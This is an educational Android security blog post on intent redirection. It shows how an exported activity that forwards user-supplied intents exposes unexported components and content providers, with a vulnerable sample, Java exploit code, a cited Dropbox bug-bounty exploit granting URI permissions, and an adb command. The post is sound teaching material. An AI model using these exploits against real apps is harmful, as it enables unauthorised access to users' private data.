<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Gaining access to protected components | mzfr's blog</title><meta name=keywords content="Android"><meta name=description content="In the previous post I talked about what activities are and how we can exploit exported activities. In this post, I&rsquo;ll show you how an attacker might be able to access the components which are protected i.e not exported. And in the end, I&rsquo;ll show you how I found one of the similar bugs on a public bug-bounty program.
What is this vulnerability? Basically what happens is that an activity(let&rsquo;s call it A) accepts some extras."><meta name=author content><link rel=canonical href=https://blog.mzfr.me/posts/2021-06-24-unexported-component/><link crossorigin=anonymous href=/assets/css/stylesheet.58451d8f813b8ca6dd4aba8121b595b6e8f0a4077ab901e0e07a009b8270bc9c.css integrity="sha256-WEUdj4E7jKbdSrqBIbWVtujwpAd6uQHg4HoAm4JwvJw=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.mzfr.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.mzfr.me/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.mzfr.me/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.mzfr.me/apple-touch-icon.png><link rel=mask-icon href=https://blog.mzfr.me/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/styles/monokai-sublime.min.css integrity="sha512-/l4iViNMhxR5MhSlak3Yw/L/7qUBifVy7MpLjeJTc8BPMRFbGplGN0xqufCDwhSdxSnVgy+e/OYsNnU75K3yyQ==" crossorigin=anonymous referrerpolicy=no-referrer><script async defer data-website-id=10e5d04b-13bb-4110-99b2-8c72f8854043 src=https://analytics.mzfr.me/umami.js></script><meta property="og:title" content="Gaining access to protected components"><meta property="og:description" content="In the previous post I talked about what activities are and how we can exploit exported activities. In this post, I&rsquo;ll show you how an attacker might be able to access the components which are protected i.e not exported. And in the end, I&rsquo;ll show you how I found one of the similar bugs on a public bug-bounty program.
What is this vulnerability? Basically what happens is that an activity(let&rsquo;s call it A) accepts some extras."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.mzfr.me/posts/2021-06-24-unexported-component/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-06-25T00:00:00+00:00"><meta property="article:modified_time" content="2021-06-25T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Gaining access to protected components"><meta name=twitter:description content="In the previous post I talked about what activities are and how we can exploit exported activities. In this post, I&rsquo;ll show you how an attacker might be able to access the components which are protected i.e not exported. And in the end, I&rsquo;ll show you how I found one of the similar bugs on a public bug-bounty program.
What is this vulnerability? Basically what happens is that an activity(let&rsquo;s call it A) accepts some extras."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://blog.mzfr.me/posts/"},{"@type":"ListItem","position":3,"name":"Gaining access to protected components","item":"https://blog.mzfr.me/posts/2021-06-24-unexported-component/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Gaining access to protected components","name":"Gaining access to protected components","description":"In the previous post I talked about what activities are and how we can exploit exported activities. In this post, I\u0026rsquo;ll show you how an attacker might be able to access the components which are protected i.e not exported. And in the end, I\u0026rsquo;ll show you how I found one of the similar bugs on a public bug-bounty program.\nWhat is this vulnerability? Basically what happens is that an activity(let\u0026rsquo;s call it A) accepts some extras.","keywords":["Android"],"articleBody":"In the previous post I talked about what activities are and how we can exploit exported activities. In this post, I‚Äôll show you how an attacker might be able to access the components which are protected i.e not exported. And in the end, I‚Äôll show you how I found one of the similar bugs on a public bug-bounty program.\nWhat is this vulnerability? Basically what happens is that an activity(let‚Äôs call it A) accepts some extras. Those could be simple string(getStringExtra) or could be a parcerable. And without any sort of verification it passes the content of those extra to trigger(startActivity). So Activity A ends up starting a new activity which was given by the user via those extras.\nThis is just like SQLi, where a developer takes a user input and uses that input directly in a query without any kind of sanitization. The only difference is that in SQLi we end up getting data from the DB but in our vulnerability, we are getting access to some of the components of the app that we shouldn‚Äôt be able to access.\nExample Let‚Äôs understand the above theory with an example. Assume there is an app called SecureApp. It has an exported activity called com.secureapp.android.rootactivity. And below is a sample code\nclass rootActivity { .... public void onCreate(Bundle bundle) { .... .... } private void handleIntent(Intent intent) { if (intent.hasExtra(\"secure_extra\")) { Intent newIntent = intent.getParcerableExtra(\"secure_extra\"); startActivity(newIntent); } } } .... Now in the above handleIntent function an intent is passed and code checks if that intent contains a secure_extra extra. If it does then it takes the value of that extra(should be parcerable) into a new intent and passes that intent to startActivity. There is no verification done, no sanitization just simply trigger the new activity.\nThe exploit code for above would be something like:\nIntent newIntent = new Intent(); // This is we assume there is another activity named com.secureapp.android.WebViewActivity // And it takes an extra called \"url\" which it will open in the webview newIntent.setClassName(\"com.secureapp.android\", \".WebViewActivity\"); newIntent.putExtra(\"url\", \"http://google.com\"); Intent start = new Intent(); start.setClassName(\"com.secureapp.android\", \".rootactivity\"); start.putExtra(\"secure_extra\", newIntent); startActivity(start); This code will trigger com.secureapp.android.rootactivity which inturn will trigger com.secureapp.android.WebViewActivity.\nTo see this vulnerability in the real world, check out this report by @bagipro. It shows the same thing.\nContent providers Now that we know how this vulnerability work and how arbitrary components can be accessed. Let see how we can access data store by the app on the device.\nUsually, an app uses content providers to manage all sorts of data on the device. The official Android documentation states that:\nA content provider manages access to a central repository of data. A provider is part of an Android application, which often provides its own UI for working with the data\nA very simple example is say in any messenger app you want to attach a file or an image so you click on that attachment icon, you select Document and then you see an explorer having a list of all the files(in your devices). You click on one and it gets attached to that message. Well, that‚Äôs the responsibility of the (one of the) content providers.\nAccessing content providers If we have the ability to start arbitrary components and we know there is a category of components responsible for handling data. We can simply access those components to get hold of any/all the data that the app might be having access to. But there is a slight catch, even when we have the ability to access any content providers of the vulnerable app only those will give us data the one which has the android:grantUriPermissions flag set to true.\nWhat does android:grantUriPermissions flag does? From Android dev documentation:\nWhether or not those who ordinarily would not have permission to access the content provider‚Äôs data can be granted permission to do so, temporarily overcoming the restriction imposed by the readPermission, writePermission, permission, and exported attributes ‚Äî ‚Äútrue‚Äù if permission can be granted, and ‚Äúfalse‚Äù if not. If ‚Äútrue‚Äù, permission can be granted to any of the content provider‚Äôs data. If ‚Äúfalse‚Äù, permission can be granted only to the data subsets listed in subelements, if any. The default value is ‚Äúfalse‚Äù.\nExample Again, to understand the above theory properly, see this report by @bagipro. The following exploit code was used:\nIntent next = new Intent(); next.setClassName(getPackageName(), \"com.dropbox.android.activity.CameraUploadSettingsActivity\"); next.setData(Uri.parse(\"content://com.dropbox.android.LocalFile/smth\")); next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION); Intent intent = new Intent(); intent.setClassName(\"com.dropbox.android\", \"com.dropbox.android.activity.LoginOrNewAcctActivity\"); intent.putExtra(\"com.dropbox.activity.extra.NEXT_INTENT\", next); startActivity(intent); Basically the com.dropbox.android.activity.LoginOrNewAcctActivity was starting any component given to it in the extra called com.dropbox.activity.extra.NEXT_INTENT. So in the exploit a URL to an internal content provider is given. Along with 4 another flags.\nIntent.FLAG_GRANT_READ_URI_PERMISSION -\u003e Give permission to do read operation on the provider Intent.FLAG_GRANT_WRITE_URI_PERMISSION -\u003e Give permission to do write operation on provider Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION -\u003e Permission to maintain persistent access to the provider. Intent.FLAG_GRANT_PREFIX_URI_PERMISSION -\u003e Access all the data under that provider instead of just acessing singular file/data source. A bug I found So I found a similar bug in an app, let‚Äôs call it com.vulnerable.app.\nBasically this app had only two exported activities:\ncom.vulnerable.app.startActivity Responsible for starting the app since it was under the android.intent.category.LAUNCHER category. com.vulnerable.app.shareactivity Responsible for sending files or other attachments. I went through the code of the startActivity but didn‚Äôt notice anything interesting. The onCreate function of the app had nothing interesting in it. The same was the case with the shareactivity. They had the correct checks in place to stop any malicious app from using the shareactivity to steal any file. But when I was going through the code I noticed a very interesting function.\nprivate void proceed(long id) { Intent intent = new Intent(App.getContext(), startActivity.class); intent.setAction(\"forward_action\"); intent.putExtra(\"forward_to\", \u003cUNEXPORTED_COMPONENT_NAME_HERE\u003e.class.getName()); intent.putExtra(\"id\", id); startActivity(intent); finish(); } You can see that it basically sends a new intent to the startActivity with action set to forward_action and the name of any component given as an extra in forward_to EXTRA.\nThis means that we can basically trigger an arbitrary components by doing something like:\nadb shell am start -n com.vulnerable.app/.startActivity -a forward_action --es \"forward_action\" \"name_of_any_exported_component\". I tested the above command and it worked(obviously üòè). So I decided to do what @bagipro does in this report. But it didn‚Äôt work because in all the excitement I forgot to check the android:resource of that provider. And they didn‚Äôt allow any root-path and had access to only 1 specific folder. Below is an example of how their provider_path.xml file looked like.\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e ","wordCount":"1422","inLanguage":"en","datePublished":"2021-06-25T00:00:00Z","dateModified":"2021-06-25T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.mzfr.me/posts/2021-06-24-unexported-component/"},"publisher":{"@type":"Organization","name":"mzfr's blog","logo":{"@type":"ImageObject","url":"https://blog.mzfr.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.mzfr.me accesskey=h title="mzfr's blog (Alt + H)">mzfr's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.mzfr.me/ title=Home><span>Home</span></a></li><li><a href=https://blog.mzfr.me/about/ title=About><span>About</span></a></li><li><a href=https://wiki.mzfr.me title=Notes><span>Notes</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li><li><a href=https://blog.mzfr.me/ctf/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Gaining access to protected components</h1><div class=post-meta><span title='2021-06-25 00:00:00 +0000 UTC'>June 25, 2021</span>&nbsp;¬∑&nbsp;7 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><ul><li><a href=#what-is-this-vulnerability aria-label="What is this vulnerability?">What is this vulnerability?</a><ul><li><a href=#example aria-label=Example>Example</a></li></ul></li><li><a href=#content-providers aria-label="Content providers">Content providers</a><ul><li><a href=#accessing-content-providers aria-label="Accessing content providers">Accessing content providers</a><ul><li><a href=#what-does-androidgranturipermissions-flag-does aria-label="What does android:grantUriPermissions flag does?">What does <code>android:grantUriPermissions</code> flag does?</a></li></ul></li><li><a href=#example-1 aria-label=Example>Example</a></li></ul></li></ul><li><a href=#a-bug-i-found aria-label="A bug I found">A bug I found</a></li></ul></div></details></div><div class=post-content><p>In the <a href=https://blog.mzfr.me/posts/2020-11-07-exported-activities/>previous post</a> I talked about what activities are and how we can exploit exported activities. In this post, I&rsquo;ll show you how an attacker might be able to access the components which are protected i.e <code>not exported</code>. And in the end, I&rsquo;ll show you how I found one of the similar bugs on a public bug-bounty program.</p><h2 id=what-is-this-vulnerability>What is this vulnerability?<a hidden class=anchor aria-hidden=true href=#what-is-this-vulnerability>#</a></h2><p>Basically what happens is that an activity(let&rsquo;s call it <code>A</code>) accepts some extras. Those could be simple string(<a href=https://developer.android.com/reference/android/content/Intent#getStringExtra(java.lang.String)>getStringExtra</a>) or could be a <a href=https://developer.android.com/guide/components/activities/parcelables-and-bundles><code>parcerable</code></a>. And without any sort of verification it passes the content of those extra to trigger(<a href=https://developer.android.com/reference/android/app/Activity#startActivity(android.content.Intent)><code>startActivity</code></a>). So <code>Activity A</code> ends up starting a new activity which was given by the user via those extras.</p><p>This is just like SQLi, where a developer takes a user input and uses that input directly in a query without any kind of sanitization. The only difference is that in SQLi we end up getting data from the DB but in our vulnerability, we are getting access to some of the components of the app that we shouldn&rsquo;t be able to access.</p><h3 id=example>Example<a hidden class=anchor aria-hidden=true href=#example>#</a></h3><p>Let&rsquo;s understand the above theory with an example. Assume there is an app called <code>SecureApp</code>. It has an exported activity called <code>com.secureapp.android.rootactivity</code>. And below is a sample code</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#76a9f9>rootActivity</span> <span style=color:#c7bf54>{</span>
</span></span><span style=display:flex><span><span style=color:#c7bf54>....</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>public</span> <span style=color:#ef8383>void</span> <span style=color:#00b1f7>onCreate</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>Bundle</span> <span style=color:#c1abea>bundle</span><span style=color:#c7bf54>)</span> <span style=color:#c7bf54>{</span>
</span></span><span style=display:flex><span>        <span style=color:#c7bf54>....</span>
</span></span><span style=display:flex><span>        <span style=color:#c7bf54>....</span>
</span></span><span style=display:flex><span>    <span style=color:#c7bf54>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>private</span> <span style=color:#ef8383>void</span> <span style=color:#00b1f7>handleIntent</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>Intent</span> <span style=color:#c1abea>intent</span><span style=color:#c7bf54>)</span> <span style=color:#c7bf54>{</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#c7bf54>(</span><span style=color:#c1abea>intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>hasExtra</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;secure_extra&#34;</span><span style=color:#c7bf54>))</span> <span style=color:#c7bf54>{</span>
</span></span><span style=display:flex><span>            <span style=color:#c1abea>Intent</span> <span style=color:#c1abea>newIntent</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>getParcerableExtra</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;secure_extra&#34;</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>            <span style=color:#c1abea>startActivity</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>newIntent</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c7bf54>}</span>
</span></span><span style=display:flex><span>    <span style=color:#c7bf54>}</span>
</span></span><span style=display:flex><span><span style=color:#c7bf54>}</span>
</span></span><span style=display:flex><span><span style=color:#c7bf54>....</span>
</span></span></code></pre></div><p>Now in the above <code>handleIntent</code> function an intent is passed and code checks if that intent contains a <code>secure_extra</code> extra. If it does then it takes the value of that extra(should be parcerable) into a new intent and passes that intent to <code>startActivity</code>. There is no verification done, no sanitization just simply trigger the new activity.</p><p>The exploit code for above would be something like:</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#c1abea>Intent</span> <span style=color:#c1abea>newIntent</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>();</span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic>// This is we assume there is another activity named com.secureapp.android.WebViewActivity
</span></span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic>// And it takes an extra called &#34;url&#34; which it will open in the webview
</span></span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic></span><span style=color:#c1abea>newIntent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>setClassName</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;com.secureapp.android&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#98c379>&#34;.WebViewActivity&#34;</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>newIntent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>putExtra</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;url&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#98c379>&#34;http://google.com&#34;</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>Intent</span> <span style=color:#c1abea>start</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>();</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>start</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>setClassName</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;com.secureapp.android&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#98c379>&#34;.rootactivity&#34;</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>start</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>putExtra</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;secure_extra&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#c1abea>newIntent</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>startActivity</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>start</span><span style=color:#c7bf54>);</span>
</span></span></code></pre></div><p>This code will trigger <code>com.secureapp.android.rootactivity</code> which inturn will trigger <code>com.secureapp.android.WebViewActivity</code>.</p><p>To see this vulnerability in the real world, check out <a href=https://hackerone.com/reports/200427>this report</a> by <a href=https://twitter.com/_bagipro>@bagipro</a>. It shows the same thing.</p><h2 id=content-providers>Content providers<a hidden class=anchor aria-hidden=true href=#content-providers>#</a></h2><p>Now that we know how this vulnerability work and how arbitrary components can be accessed. Let see how we can access data store by the app on the device.</p><p>Usually, an app uses content providers to manage all sorts of data on the device. The official Android documentation states that:</p><blockquote><p>A content provider manages access to a central repository of data. A provider is part of an Android application, which often provides its own UI for working with the data</p></blockquote><p>A very simple example is say in any messenger app you want to attach a file or an image so you click on that attachment icon, you select <code>Document</code> and then you see an explorer having a list of all the files(in your devices). You click on one and it gets attached to that message. Well, that&rsquo;s the responsibility of the (one of the) content providers.</p><h3 id=accessing-content-providers>Accessing content providers<a hidden class=anchor aria-hidden=true href=#accessing-content-providers>#</a></h3><p>If we have the ability to start arbitrary components and we know there is a category of components responsible for handling data. We can simply access those components to get hold of any/all the data that the app might be having access to. But there is a slight catch, even when we have the ability to access any content providers of the vulnerable app only those will give us data the one which has the <code>android:grantUriPermissions</code> flag set to <code>true</code>.</p><h4 id=what-does-androidgranturipermissions-flag-does>What does <code>android:grantUriPermissions</code> flag does?<a hidden class=anchor aria-hidden=true href=#what-does-androidgranturipermissions-flag-does>#</a></h4><p>From Android dev documentation:</p><blockquote><p>Whether or not those who ordinarily would not have permission to access the content provider&rsquo;s data can be granted permission to do so, temporarily overcoming the restriction imposed by the readPermission, writePermission, permission, and exported attributes ‚Äî &ldquo;true&rdquo; if permission can be granted, and &ldquo;false&rdquo; if not. If &ldquo;true&rdquo;, permission can be granted to any of the content provider&rsquo;s data. If &ldquo;false&rdquo;, permission can be granted only to the data subsets listed in subelements, if any. The default value is &ldquo;false&rdquo;.</p></blockquote><h3 id=example-1>Example<a hidden class=anchor aria-hidden=true href=#example-1>#</a></h3><p>Again, to understand the above theory properly, see <a href=https://hackerone.com/reports/272044>this report</a> by <a href=https://twitter.com/_bagipro>@bagipro</a>. The following exploit code was used:</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>        <span style=color:#c1abea>Intent</span> <span style=color:#c1abea>next</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>();</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>next</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>setClassName</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>getPackageName</span><span style=color:#c7bf54>(),</span> <span style=color:#98c379>&#34;com.dropbox.android.activity.CameraUploadSettingsActivity&#34;</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>next</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>setData</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>Uri</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>parse</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;content://com.dropbox.android.LocalFile/smth&#34;</span><span style=color:#c7bf54>));</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>next</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>setFlags</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>Intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>FLAG_GRANT_READ_URI_PERMISSION</span>
</span></span><span style=display:flex><span>                <span style=color:#c7bf54>|</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>FLAG_GRANT_WRITE_URI_PERMISSION</span>
</span></span><span style=display:flex><span>                <span style=color:#c7bf54>|</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span>
</span></span><span style=display:flex><span>                <span style=color:#c7bf54>|</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>FLAG_GRANT_PREFIX_URI_PERMISSION</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>Intent</span> <span style=color:#c1abea>intent</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>();</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>setClassName</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;com.dropbox.android&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#98c379>&#34;com.dropbox.android.activity.LoginOrNewAcctActivity&#34;</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>putExtra</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;com.dropbox.activity.extra.NEXT_INTENT&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#c1abea>next</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>startActivity</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>intent</span><span style=color:#c7bf54>);</span>
</span></span></code></pre></div><p>Basically the <code>com.dropbox.android.activity.LoginOrNewAcctActivity</code> was starting any component given to it in the extra called <code>com.dropbox.activity.extra.NEXT_INTENT</code>. So in the exploit a URL to an internal <code>content</code> provider is given. Along with 4 another flags.</p><ul><li><code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code> -> Give permission to do read operation on the provider</li><li><code>Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code> -> Give permission to do write operation on provider</li><li><code>Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</code> -> Permission to maintain persistent access to the provider.</li><li><code>Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</code> -> Access all the data under that provider instead of just acessing singular file/data source.</li></ul><h1 id=a-bug-i-found>A bug I found<a hidden class=anchor aria-hidden=true href=#a-bug-i-found>#</a></h1><p>So I found a similar bug in an app, let&rsquo;s call it <code>com.vulnerable.app</code>.</p><p>Basically this app had only two exported activities:</p><ul><li><code>com.vulnerable.app.startActivity</code><ul><li>Responsible for starting the app since it was under the <code>android.intent.category.LAUNCHER</code> category.</li></ul></li><li><code>com.vulnerable.app.shareactivity</code><ul><li>Responsible for sending files or other attachments.</li></ul></li></ul><p>I went through the code of the <code>startActivity</code> but didn&rsquo;t notice anything interesting. The <code>onCreate</code> function of the app had nothing interesting in it. The same was the case with the <code>shareactivity</code>. They had the correct checks in place to stop any malicious app from using the shareactivity to steal any file. But when I was going through the code I noticed a very interesting function.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#c678dd>private</span> <span style=color:#ef8383>void</span> <span style=color:#00b1f7>proceed</span><span style=color:#c7bf54>(</span><span style=color:#ef8383>long</span> <span style=color:#c1abea>id</span><span style=color:#c7bf54>)</span> <span style=color:#c7bf54>{</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>Intent</span> <span style=color:#c1abea>intent</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Intent</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>App</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>getContext</span><span style=color:#c7bf54>(),</span> <span style=color:#c1abea>startActivity</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>class</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>setAction</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;forward_action&#34;</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>putExtra</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;forward_to&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#c7bf54>&lt;</span><span style=color:#c1abea>UNEXPORTED_COMPONENT_NAME_HERE</span><span style=color:#c7bf54>&gt;.</span><span style=color:#b3d23c>class</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>getName</span><span style=color:#c7bf54>());</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>intent</span><span style=color:#c7bf54>.</span><span style=color:#b3d23c>putExtra</span><span style=color:#c7bf54>(</span><span style=color:#98c379>&#34;id&#34;</span><span style=color:#c7bf54>,</span> <span style=color:#c1abea>id</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>startActivity</span><span style=color:#c7bf54>(</span><span style=color:#c1abea>intent</span><span style=color:#c7bf54>);</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>finish</span><span style=color:#c7bf54>();</span>
</span></span><span style=display:flex><span>    <span style=color:#c7bf54>}</span>
</span></span></code></pre></div><p>You can see that it basically sends a new intent to the <code>startActivity</code> with action set to <code>forward_action</code> and the name of any component given as an extra in <code>forward_to</code> EXTRA.</p><p>This means that we can basically trigger an arbitrary components by doing something like:</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>adb shell am start -n com.vulnerable.app/.startActivity -a forward_action --es <span style=color:#63c381>&#34;forward_action&#34;</span> <span style=color:#63c381>&#34;name_of_any_exported_component&#34;</span>.
</span></span></code></pre></div><p>I tested the above command and it worked(obviously üòè).
